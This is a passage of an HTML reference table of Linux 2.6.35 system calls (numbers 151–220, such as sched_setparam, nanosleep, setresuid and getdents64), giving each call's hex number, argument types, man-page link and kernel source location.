href="http://www.kernel.org/doc/man-pages/online/pages/man2/munlock.2.html" target="_blank" rel="noopener">sys_munlock</a></td><td>0x97</td><td>unsigned long start</td><td>size_t len</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/mm/mlock.c?v=2.6.35#L519" target="_blank" rel="noopener">mm/mlock.c:519</a></td></tr><tr><td>152</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mlockall.2.html" target="_blank" rel="noopener">sys_mlockall</a></td><td>0x98</td><td>int flags</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/mm/mlock.c?v=2.6.35#L556" target="_blank" rel="noopener">mm/mlock.c:556</a></td></tr><tr><td>153</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/munlockall.2.html" target="_blank" rel="noopener">sys_munlockall</a></td><td>0x99</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/mm/mlock.c?v=2.6.35#L584" target="_blank" rel="noopener">mm/mlock.c:584</a></td></tr><tr><td>154</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sched_setparam.2.html" target="_blank" rel="noopener">sys_sched_setparam</a></td><td>0x9a</td><td>pid_t pid</td><td><a href="http://lxr.free-electrons.com/source/include/linux/sched.h?v=2.6.35#L46" target="_blank" rel="noopener">struct sched_param __user *param</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sched.c?v=2.6.35#L4616" target="_blank" rel="noopener">kernel/sched.c:4616</a></td></tr><tr><td>155</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sched_getparam.2.html" target="_blank" rel="noopener">sys_sched_getparam</a></td><td>0x9b</td><td>pid_t pid</td><td><a href="http://lxr.free-electrons.com/source/include/linux/sched.h?v=2.6.35#L46" target="_blank" rel="noopener">struct sched_param __user *param</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sched.c?v=2.6.35#L4651" target="_blank" rel="noopener">kernel/sched.c:4651</a></td></tr><tr><td>156</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sched_setscheduler.2.html" target="_blank" rel="noopener">sys_sched_setscheduler</a></td><td>0x9c</td><td>pid_t pid</td><td>int policy</td><td><a href="http://lxr.free-electrons.com/source/include/linux/sched.h?v=2.6.35#L46" target="_blank" rel="noopener">struct sched_param __user *param</a></td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sched.c?v=2.6.35#L4601" target="_blank" rel="noopener">kernel/sched.c:4601</a></td></tr><tr><td>157</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sched_getscheduler.2.html" target="_blank" rel="noopener">sys_sched_getscheduler</a></td><td>0x9d</td><td>pid_t pid</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sched.c?v=2.6.35#L4625" target="_blank" rel="noopener">kernel/sched.c:4625</a></td></tr><tr><td>158</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sched_yield.2.html" target="_blank" rel="noopener">sys_sched_yield</a></td><td>0x9e</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sched.c?v=2.6.35#L4851" target="_blank" rel="noopener">kernel/sched.c:4851</a></td></tr><tr><td>159</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sched_get_priority_max.2.html" target="_blank" rel="noopener">sys_sched_get_priority_max</a></td><td>0x9f</td><td>int policy</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sched.c?v=2.6.35#L4989" target="_blank" rel="noopener">kernel/sched.c:4989</a></td></tr><tr><td>160</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sched_get_priority_min.2.html" target="_blank" rel="noopener">sys_sched_get_priority_min</a></td><td>0xa0</td><td>int policy</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sched.c?v=2.6.35#L5014" target="_blank" rel="noopener">kernel/sched.c:5014</a></td></tr><tr><td>161</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sched_rr_get_interval.2.html" target="_blank" rel="noopener">sys_sched_rr_get_interval</a></td><td>0xa1</td><td>pid_t pid</td><td><a href="http://lxr.free-electrons.com/source/include/linux/coda.h?v=2.6.35#L116" target="_blank" rel="noopener">struct timespec __user *interval</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sched.c?v=2.6.35#L5039" target="_blank" rel="noopener">kernel/sched.c:5039</a></td></tr><tr><td>162</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/nanosleep.2.html" target="_blank" rel="noopener">sys_nanosleep</a></td><td>0xa2</td><td><a href="http://lxr.free-electrons.com/source/include/linux/coda.h?v=2.6.35#L116" target="_blank" rel="noopener">struct timespec __user *rqtp</a></td><td><a href="http://lxr.free-electrons.com/source/include/linux/coda.h?v=2.6.35#L116" target="_blank" rel="noopener">struct timespec __user *rmtp</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/hrtimer.c?v=2.6.35#L1606" target="_blank" rel="noopener">kernel/hrtimer.c:1606</a></td></tr><tr><td>163</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mremap.2.html" target="_blank" rel="noopener">sys_mremap</a></td><td>0xa3</td><td>unsigned long addr</td><td>unsigned long old_len</td><td>unsigned long new_len</td><td>unsigned long flags</td><td>unsigned long new_addr</td><td><a href="http://lxr.free-electrons.com/source/mm/mremap.c?v=2.6.35#L510" target="_blank" rel="noopener">mm/mremap.c:510</a></td></tr><tr><td>164</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setresuid16.2.html" target="_blank" rel="noopener">sys_setresuid16</a></td><td>0xa4</td><td>old_uid_t ruid</td><td>old_uid_t euid</td><td>old_uid_t suid</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L75" target="_blank" rel="noopener">kernel/uid16.c:75</a></td></tr><tr><td>165</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getresuid16.2.html" target="_blank" rel="noopener">sys_getresuid16</a></td><td>0xa5</td><td>old_uid_t __user *ruid</td><td>old_uid_t __user *euid</td><td>old_uid_t __user *suid</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L84" target="_blank" rel="noopener">kernel/uid16.c:84</a></td></tr><tr><td>166</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/vm86.2.html" target="_blank" rel="noopener">sys_vm86</a></td><td>0xa6</td><td>unsigned long</td><td>unsigned long</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/ptrace.h?v=2.6.35#L19" target="_blank" rel="noopener">struct pt_regs *</a></td><td>-</td><td>-</td><td>[not found:](<a href="http://lxr.free-electrons.com/source/not" target="_blank" rel="noopener">http://lxr.free-electrons.com/source/not</a> found?v=2.6.35#L)</td></tr><tr><td>167</td><td>not implemented</td><td>0xa7</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>168</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/poll.2.html" target="_blank" rel="noopener">sys_poll</a></td><td>0xa8</td><td><a href="http://lxr.free-electrons.com/source/include/asm-generic/poll.h?v=2.6.35#L31" target="_blank" rel="noopener">struct pollfd __user *ufds</a></td><td>unsigned int nfds</td><td>long timeout</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/select.c?v=2.6.35#L915" target="_blank" rel="noopener">fs/select.c:915</a></td></tr><tr><td>169</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/nfsservctl.2.html" target="_blank" rel="noopener">sys_nfsservctl</a></td><td>0xa9</td><td>int cmd</td><td><a href="http://lxr.free-electrons.com/source/include/linux/nfsd/syscall.h?v=2.6.35#L77" target="_blank" rel="noopener">struct nfsctl_arg __user *arg</a></td><td>void __user *res</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/nfsctl.c?v=2.6.35#L86" target="_blank" rel="noopener">fs/nfsctl.c:86</a></td></tr><tr><td>170</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setresgid16.2.html" target="_blank" rel="noopener">sys_setresgid16</a></td><td>0xaa</td><td>old_gid_t rgid</td><td>old_gid_t egid</td><td>old_gid_t sgid</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L96" target="_blank" rel="noopener">kernel/uid16.c:96</a></td></tr><tr><td>171</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getresgid16.2.html" target="_blank" rel="noopener">sys_getresgid16</a></td><td>0xab</td><td>old_gid_t __user *rgid</td><td>old_gid_t __user *egid</td><td>old_gid_t __user *sgid</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L106" target="_blank" rel="noopener">kernel/uid16.c:106</a></td></tr><tr><td>172</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/prctl.2.html" target="_blank" rel="noopener">sys_prctl</a></td><td>0xac</td><td>int option</td><td>unsigned long arg2</td><td>unsigned long arg3</td><td>unsigned long arg4</td><td>unsigned long arg5</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L1466" target="_blank" rel="noopener">kernel/sys.c:1466</a></td></tr><tr><td>173</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rt_sigreturn.2.html" target="_blank" rel="noopener">sys_rt_sigreturn</a></td><td>0xad</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/ptrace.h?v=2.6.35#L19" target="_blank" rel="noopener">struct pt_regs *</a></td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/kernel/entry.S?v=2.6.35#L771" target="_blank" rel="noopener">arch/alpha/kernel/entry.S:771</a></td></tr><tr><td>174</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rt_sigaction.2.html" target="_blank" rel="noopener">sys_rt_sigaction</a></td><td>0xae</td><td>int sig</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/signal.h?v=2.6.35#L123" target="_blank" rel="noopener">const struct sigaction __user *act</a></td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/signal.h?v=2.6.35#L123" target="_blank" rel="noopener">struct sigaction __user *oact</a></td><td>size_t sigsetsize</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2624" target="_blank" rel="noopener">kernel/signal.c:2624</a></td></tr><tr><td>175</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rt_sigprocmask.2.html" target="_blank" rel="noopener">sys_rt_sigprocmask</a></td><td>0xaf</td><td>int how</td><td>sigset_t __user *set</td><td>sigset_t __user *oset</td><td>size_t sigsetsize</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2111" target="_blank" rel="noopener">kernel/signal.c:2111</a></td></tr><tr><td>176</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rt_sigpending.2.html" target="_blank" rel="noopener">sys_rt_sigpending</a></td><td>0xb0</td><td>sigset_t __user *set</td><td>size_t sigsetsize</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2171" target="_blank" rel="noopener">kernel/signal.c:2171</a></td></tr><tr><td>177</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rt_sigtimedwait.2.html" target="_blank" rel="noopener">sys_rt_sigtimedwait</a></td><td>0xb1</td><td>const sigset_t __user *uthese</td><td>siginfo_t __user *uinfo</td><td><a href="http://lxr.free-electrons.com/source/include/linux/coda.h?v=2.6.35#L116" target="_blank" rel="noopener">const struct timespec __user *uts</a></td><td>size_t sigsetsize</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2242" target="_blank" rel="noopener">kernel/signal.c:2242</a></td></tr><tr><td>178</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rt_sigqueueinfo.2.html" target="_blank" rel="noopener">sys_rt_sigqueueinfo</a></td><td>0xb2</td><td>int pid</td><td>int sig</td><td>siginfo_t __user *uinfo</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2404" target="_blank" rel="noopener">kernel/signal.c:2404</a></td></tr><tr><td>179</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/rt_sigsuspend.2.html" target="_blank" rel="noopener">sys_rt_sigsuspend</a></td><td>0xb3</td><td>sigset_t __user *unewset</td><td>size_t sigsetsize</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2710" target="_blank" rel="noopener">kernel/signal.c:2710</a></td></tr><tr><td>180</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pread64.2.html" target="_blank" rel="noopener">sys_pread64</a></td><td>0xb4</td><td>unsigned int fd</td><td>char __user *buf</td><td>size_t count</td><td>loff_t pos</td><td>-</td><td>[not found:](<a href="http://lxr.free-electrons.com/source/not" target="_blank" rel="noopener">http://lxr.free-electrons.com/source/not</a> found?v=2.6.35#L)</td></tr><tr><td>181</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pwrite64.2.html" target="_blank" rel="noopener">sys_pwrite64</a></td><td>0xb5</td><td>unsigned int fd</td><td>const char __user *buf</td><td>size_t count</td><td>loff_t pos</td><td>-</td><td>[not found:](<a href="http://lxr.free-electrons.com/source/not" target="_blank" rel="noopener">http://lxr.free-electrons.com/source/not</a> found?v=2.6.35#L)</td></tr><tr><td>182</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/chown16.2.html" target="_blank" rel="noopener">sys_chown16</a></td><td>0xb6</td><td>const char __user *filename</td><td>old_uid_t user</td><td>old_gid_t group</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/uid16.c?v=2.6.35#L19" target="_blank" rel="noopener">kernel/uid16.c:19</a></td></tr><tr><td>183</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getcwd.2.html" target="_blank" rel="noopener">sys_getcwd</a></td><td>0xb7</td><td>char __user *buf</td><td>unsigned long size</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/dcache.c?v=2.6.35#L2104" target="_blank" rel="noopener">fs/dcache.c:2104</a></td></tr><tr><td>184</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/capget.2.html" target="_blank" rel="noopener">sys_capget</a></td><td>0xb8</td><td>cap_user_header_t header</td><td>cap_user_data_t dataptr</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/capability.c?v=2.6.35#L161" target="_blank" rel="noopener">kernel/capability.c:161</a></td></tr><tr><td>185</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/capset.2.html" target="_blank" rel="noopener">sys_capset</a></td><td>0xb9</td><td>cap_user_header_t header</td><td>const cap_user_data_t data</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/capability.c?v=2.6.35#L235" target="_blank" rel="noopener">kernel/capability.c:235</a></td></tr><tr><td>186</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sigaltstack.2.html" target="_blank" rel="noopener">sys_sigaltstack</a></td><td>0xba</td><td>const stack_t __user *</td><td>stack_t __user *</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/ptrace.h?v=2.6.35#L19" target="_blank" rel="noopener">struct pt_regs *</a></td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/kernel/signal.c?v=2.6.35#L199" target="_blank" rel="noopener">arch/alpha/kernel/signal.c:199</a></td></tr><tr><td>187</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sendfile.2.html" target="_blank" rel="noopener">sys_sendfile</a></td><td>0xbb</td><td>int out_fd</td><td>int in_fd</td><td>off_t __user *offset</td><td>size_t count</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/read_write.c?v=2.6.35#L897" target="_blank" rel="noopener">fs/read_write.c:897</a></td></tr><tr><td>188</td><td>not implemented</td><td>0xbc</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>189</td><td>not implemented</td><td>0xbd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td></td></tr><tr><td>190</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/vfork.2.html" target="_blank" rel="noopener">sys_vfork</a></td><td>0xbe</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/ptrace.h?v=2.6.35#L19" target="_blank" rel="noopener">struct pt_regs *</a></td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/kernel/entry.S?v=2.6.35#L746" target="_blank" rel="noopener">arch/alpha/kernel/entry.S:746</a></td></tr><tr><td>191</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getrlimit.2.html" target="_blank" rel="noopener">sys_getrlimit</a></td><td>0xbf</td><td>unsigned int resource</td><td><a href="http://lxr.free-electrons.com/source/include/linux/resource.h?v=2.6.35#L41" target="_blank" rel="noopener">struct rlimit __user *rlim</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L1237" target="_blank" rel="noopener">kernel/sys.c:1237</a></td></tr><tr><td>192</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mmap_pgoff.2.html" target="_blank" rel="noopener">sys_mmap_pgoff</a></td><td>0xc0</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/mm/mmap.c?v=2.6.35#L1091" target="_blank" rel="noopener">mm/mmap.c:1091</a></td></tr><tr><td>193</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/truncate64.2.html" target="_blank" rel="noopener">sys_truncate64</a></td><td>0xc1</td><td>const char __user *path</td><td>loff_t length</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="http://lxr.free-electrons.com/source/not" target="_blank" rel="noopener">http://lxr.free-electrons.com/source/not</a> found?v=2.6.35#L)</td></tr><tr><td>194</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ftruncate64.2.html" target="_blank" rel="noopener">sys_ftruncate64</a></td><td>0xc2</td><td>unsigned int fd</td><td>loff_t length</td><td>-</td><td>-</td><td>-</td><td>[not found:](<a href="http://lxr.free-electrons.com/source/not" target="_blank" rel="noopener">http://lxr.free-electrons.com/source/not</a> found?v=2.6.35#L)</td></tr><tr><td>195</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/stat64.2.html" target="_blank" rel="noopener">sys_stat64</a></td><td>0xc3</td><td>char __user *filename</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/stat.h?v=2.6.35#L25" target="_blank" rel="noopener">struct stat64 __user *statbuf</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/stat.c?v=2.6.35#L358" target="_blank" rel="noopener">fs/stat.c:358</a></td></tr><tr><td>196</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/lstat64.2.html" target="_blank" rel="noopener">sys_lstat64</a></td><td>0xc4</td><td>char __user *filename</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/stat.h?v=2.6.35#L25" target="_blank" rel="noopener">struct stat64 __user *statbuf</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/stat.c?v=2.6.35#L369" target="_blank" rel="noopener">fs/stat.c:369</a></td></tr><tr><td>197</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fstat64.2.html" target="_blank" rel="noopener">sys_fstat64</a></td><td>0xc5</td><td>unsigned long fd</td><td><a href="http://lxr.free-electrons.com/source/arch/alpha/include/asm/stat.h?v=2.6.35#L25" target="_blank" rel="noopener">struct stat64 __user *statbuf</a></td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/stat.c?v=2.6.35#L380" target="_blank" rel="noopener">fs/stat.c:380</a></td></tr><tr><td>198</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/lchown.2.html" target="_blank" rel="noopener">sys_lchown</a></td><td>0xc6</td><td>const char __user *filename</td><td>uid_t user</td><td>gid_t group</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L583" target="_blank" rel="noopener">fs/open.c:583</a></td></tr><tr><td>199</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getuid.2.html" target="_blank" rel="noopener">sys_getuid</a></td><td>0xc7</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/timer.c?v=2.6.35#L1359" target="_blank" rel="noopener">kernel/timer.c:1359</a></td></tr><tr><td>200</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getgid.2.html" target="_blank" rel="noopener">sys_getgid</a></td><td>0xc8</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/timer.c?v=2.6.35#L1371" target="_blank" rel="noopener">kernel/timer.c:1371</a></td></tr><tr><td>201</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/geteuid.2.html" target="_blank" rel="noopener">sys_geteuid</a></td><td>0xc9</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/timer.c?v=2.6.35#L1365" target="_blank" rel="noopener">kernel/timer.c:1365</a></td></tr><tr><td>202</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getegid.2.html" target="_blank" rel="noopener">sys_getegid</a></td><td>0xca</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/timer.c?v=2.6.35#L1377" target="_blank" rel="noopener">kernel/timer.c:1377</a></td></tr><tr><td>203</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setreuid.2.html" target="_blank" rel="noopener">sys_setreuid</a></td><td>0xcb</td><td>uid_t ruid</td><td>uid_t euid</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L594" target="_blank" rel="noopener">kernel/sys.c:594</a></td></tr><tr><td>204</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setregid.2.html" target="_blank" rel="noopener">sys_setregid</a></td><td>0xcc</td><td>gid_t rgid</td><td>gid_t egid</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L484" target="_blank" rel="noopener">kernel/sys.c:484</a></td></tr><tr><td>205</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getgroups.2.html" target="_blank" rel="noopener">sys_getgroups</a></td><td>0xcd</td><td>int gidsetsize</td><td>gid_t __user *grouplist</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/groups.c?v=2.6.35#L203" target="_blank" rel="noopener">kernel/groups.c:203</a></td></tr><tr><td>206</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setgroups.2.html" target="_blank" rel="noopener">sys_setgroups</a></td><td>0xce</td><td>int gidsetsize</td><td>gid_t __user *grouplist</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/groups.c?v=2.6.35#L232" target="_blank" rel="noopener">kernel/groups.c:232</a></td></tr><tr><td>207</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fchown.2.html" target="_blank" rel="noopener">sys_fchown</a></td><td>0xcf</td><td>unsigned int fd</td><td>uid_t user</td><td>gid_t group</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L602" target="_blank" rel="noopener">fs/open.c:602</a></td></tr><tr><td>208</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setresuid.2.html" target="_blank" rel="noopener">sys_setresuid</a></td><td>0xd0</td><td>uid_t ruid</td><td>uid_t euid</td><td>uid_t suid</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L696" target="_blank" rel="noopener">kernel/sys.c:696</a></td></tr><tr><td>209</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getresuid.2.html" target="_blank" rel="noopener">sys_getresuid</a></td><td>0xd1</td><td>uid_t __user *ruid</td><td>uid_t __user *euid</td><td>uid_t __user *suid</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L746" target="_blank" rel="noopener">kernel/sys.c:746</a></td></tr><tr><td>210</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setresgid.2.html" target="_blank" rel="noopener">sys_setresgid</a></td><td>0xd2</td><td>gid_t rgid</td><td>gid_t egid</td><td>gid_t sgid</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L761" target="_blank" rel="noopener">kernel/sys.c:761</a></td></tr><tr><td>211</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getresgid.2.html" target="_blank" rel="noopener">sys_getresgid</a></td><td>0xd3</td><td>gid_t __user *rgid</td><td>gid_t __user *egid</td><td>gid_t __user *sgid</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L800" target="_blank" rel="noopener">kernel/sys.c:800</a></td></tr><tr><td>212</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/chown.2.html" target="_blank" rel="noopener">sys_chown</a></td><td>0xd4</td><td>const char __user *filename</td><td>uid_t user</td><td>gid_t group</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L539" target="_blank" rel="noopener">fs/open.c:539</a></td></tr><tr><td>213</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setuid.2.html" target="_blank" rel="noopener">sys_setuid</a></td><td>0xd5</td><td>uid_t uid</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L655" target="_blank" rel="noopener">kernel/sys.c:655</a></td></tr><tr><td>214</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setgid.2.html" target="_blank" rel="noopener">sys_setgid</a></td><td>0xd6</td><td>gid_t gid</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L531" target="_blank" rel="noopener">kernel/sys.c:531</a></td></tr><tr><td>215</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setfsuid.2.html" target="_blank" rel="noopener">sys_setfsuid</a></td><td>0xd7</td><td>uid_t uid</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L819" target="_blank" rel="noopener">kernel/sys.c:819</a></td></tr><tr><td>216</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/setfsgid.2.html" target="_blank" rel="noopener">sys_setfsgid</a></td><td>0xd8</td><td>gid_t gid</td><td>-</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/kernel/sys.c?v=2.6.35#L852" target="_blank" rel="noopener">kernel/sys.c:852</a></td></tr><tr><td>217</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/pivot_root.2.html" target="_blank" rel="noopener">sys_pivot_root</a></td><td>0xd9</td><td>const char __user *new_root</td><td>const char __user *put_old</td><td>-</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/namespace.c?v=2.6.35#L2184" target="_blank" rel="noopener">fs/namespace.c:2184</a></td></tr><tr><td>218</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mincore.2.html" target="_blank" rel="noopener">sys_mincore</a></td><td>0xda</td><td>unsigned long start</td><td>size_t len</td><td>unsigned char __user * vec</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/mm/mincore.c?v=2.6.35#L256" target="_blank" rel="noopener">mm/mincore.c:256</a></td></tr><tr><td>219</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/madvise.2.html" target="_blank" rel="noopener">sys_madvise</a></td><td>0xdb</td><td>unsigned long start</td><td>size_t len</td><td>int behavior</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/mm/madvise.c?v=2.6.35#L335" target="_blank" rel="noopener">mm/madvise.c:335</a></td></tr><tr><td>220</td><td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/getdents64.2.html" target="_blank" rel="noopener">sys_getdents64</a></td><td>0xdc</td><td>unsigned int fd</td><td><a href="http://lxr.free-electrons.com/source/include/linux/dirent.h?v=2.6.35#L4" target="_blank" rel="noopener">struct linux_dirent64 __user *dirent</a></td><td>unsigned int count</td><td>-</td><td>-</td><td><a href="http://lxr.free-electrons.com/source/fs/readdir.c?v=2.6.35#L273" target="_blank" rel="noopener">fs/readdir.c:273</a></td></tr><tr><td>221</td><td><a 